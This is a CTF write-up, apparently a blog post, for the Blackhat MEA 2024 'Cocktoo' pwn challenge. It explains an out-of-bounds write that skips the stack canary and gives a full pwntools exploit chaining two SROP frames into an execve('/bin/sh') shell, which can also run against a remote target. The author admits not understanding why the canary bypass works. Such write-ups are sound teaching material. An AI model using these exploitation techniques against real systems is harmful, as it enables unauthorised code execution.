@@ -1,0 +1,222 @@
+---
+title: Blackhat MEA '24 Quals - Pwn - Cocktoo
+date: '2024-09-02'
+tags: ['blackhatmea24', 'rop', 'execve']
+draft: false
+summary: Utilizing an out-of-bound write to gain RIP control and then use a gadget to perform execve syscall
+---
+
+## Challenge Description
+
+![alt text](/static/writeups/blackhatmea24-quals/image-1.png)
+
+## Solution
+
+This was the easy pwn challenge in BHMEA-24 quals. In this challenge, we were provided with a binary that had the following mitigations:
+
+```
+[*] '/home/theflash2k/Documents/CTFs/BHMEA24/pwn/cucktoo/cockatoo'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+```
+
+Looking at the disassembly:
+
+```c:disassembly
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // rax
+  __int64 v4; // rax
+  char v6[256]; // [rsp+0h] [rbp-110h] BYREF
+  __int64 v7; // [rsp+100h] [rbp-10h]
+  unsigned __int64 v8; // [rsp+108h] [rbp-8h]
+
+  v8 = __readfsqword(0x28u);
+  memset(v6, 0, 0x108uLL);
+  while ( read(0LL, &v6[v7], 1LL) == 1 && v6[v7] != 10 )
+  {
+    v3 = v7++;
+    if ( v3 == 256 )
+      goto LABEL_6;
+  }
+  v6[v7 + 1] = 0;
+LABEL_6:
+  v4 = strlen(v6);
+  write(1LL, v6, v4);
+  return 0;
+}
+```
+
+In this function, we have a buffer of `0x100` size called `v6` and after that, there is another variable which will hold the size called `v7`.
+
+Looking at the code: `memset(v6, 0, 0x108uLL);`, what this will do is simply empty the `v6` buffer. But since the size is `0x108`, it will also empty the `v7` and set the size to 0.
+
+Looking at the condition in while loop:
+
+```c
+while ( read(0LL, &v6[v7], 1LL) == 1 && v6[v7] != 10 )
+```
+
+We can see that, it will simply read 1-byte into the `v6` buffer at index `v7` and the data should not be `10` i.e. `\n`.
+
+The only problem here is that there exists the canary. Let's try and debug this program in GDB to see how it behaves when we give it a larger input.
+
+Looking at the template we have:
+
+```py:exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+
+encode = lambda e: e if type(e) == bytes else str(e).encode()
+hexleak = lambda l: int(l[:-1] if l[-1] == b'\n' else l, 16)
+fixleak = lambda l: unpack((l[:-1] if l[-1] == b'\n' else l).ljust(8, b"\x00"))
+
+exe = "./cockatoo"
+elf = context.binary = ELF(exe)
+libc = elf.libc
+io = remote(sys.argv[1], int(sys.argv[2])
+    ) if args.REMOTE else process(argv=[exe], aslr=False)
+if args.GDB: gdb.attach(io, """
+    b *main+188
+""")
+
+payload = flat(
+    cyclic(0x100, n=8)
+)
+io.sendline(payload)
+
+io.interactive()
+```
+
+Now, here we can see what's in the RSP:
+
+![alt text](/static/writeups/blackhatmea24-quals/image-2.png)
+
+We overwrote the last byte of the canary:
+
+![alt text](/static/writeups/blackhatmea24-quals/image-3.png)
+
+However, due to this line of code:
+
+```c
+v6[v7 + 1] = 0;
+```
+
+It will set the last byte of the canary to NULL. Hence returning the canary back to its original state.
+
+## Overwriting RIP and gaining code execution
+
+What we do is simply send `0x17` and it will RIP control.
+
+> Honestly, I do not know why it skipped over the canary, if you know, please let me know. I just debugged it and it just worked 😭😭😭
+
+```py
+payload = flat(
+    cyclic(0x100, n=8),
+    b"\x17",
+    b"AAAAAAAA"
+)
+io.sendline(payload)
+```
+
+![alt text](/static/writeups/blackhatmea24-quals/image.png)
+
+After this, we start looking for gadgets. Some of the gadgets that we find were useful are:
+
+![alt text](/static/writeups/blackhatmea24-quals/image-4.png)
+
+> My command `gadget` missed one useful gadget: `syscall ; ret` (because it using ROPGadget under the hood). So, using `ropper`:
+
+```
+0x0000000000401383: syscall;
+0x0000000000401a8b: syscall; ret;
+```
+
+At this point, I used two SROP payloads.
+
+1. To write `/bin/sh` in the BSS section
+2. To call execve.
+
+Since we have the `syscall; ret` gadget, it became really easy.
+
+The first stub would do the following:
+
+```
+RAX = 0xF
+```
+
+which would invoke the Sigreturn allowing us to write the `/bin/sh` string in the bss. What I did after that is simply store the next ROP chain in the `bss+8`, and in the previous frame, set this address to be equal to RSP. Essentially creating this as the stack and controlling RIP.
+
+So, the final payload becomes:
+
+```py:exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+
+encode = lambda e: e if type(e) == bytes else str(e).encode()
+hexleak = lambda l: int(l[:-1] if l[-1] == b'\n' else l, 16)
+fixleak = lambda l: unpack((l[:-1] if l[-1] == b'\n' else l).ljust(8, b"\x00"))
+
+exe = "./cockatoo"
+elf = context.binary = ELF(exe)
+libc = elf.libc
+io = remote(sys.argv[1], int(sys.argv[2])
+    ) if args.REMOTE else process(argv=[exe], aslr=False)
+if args.GDB: gdb.attach(io, """
+    b *main+188
+""")
+
+POP_RAX = 0x0000000000401001
+SYSCALL_RET = 0x0000000000401a8b
+
+frame_read = SigreturnFrame()
+frame_read.rax = 0x0
+frame_read.rdi = 0x0
+frame_read.rsi = elf.bss()
+frame_read.rdx = 0x100
+frame_read.rsp = elf.bss() + 0x8
+frame_read.rip = SYSCALL_RET
+
+frame_execve = SigreturnFrame()
+frame_execve.rax = 0x3b
+frame_execve.rdi = elf.bss()
+frame_execve.rsi = 0x0
+frame_execve.rdx = 0x0
+frame_execve.rip = SYSCALL_RET
+
+payload = flat(
+    cyclic(0x100, n=8),
+    b"\x17",
+    POP_RAX,
+    0xf,
+    SYSCALL_RET,
+    frame_read
+)
+
+io.sendline(payload)
+time.sleep(0.5)
+
+payload_2 = flat(
+    b"/bin/sh\x00",
+    POP_RAX,
+    0xf,
+    SYSCALL_RET,
+    frame_execve
+)
+io.sendline(payload_2)
+
+io.interactive()
+```
+
+![alt text](/static/writeups/blackhatmea24-quals/image-6.png)
+
+Overall, the challenge was indeed easy, but I still do not get the actual idea as to how we were able to bypass the canary and directly overwrite the RIP.
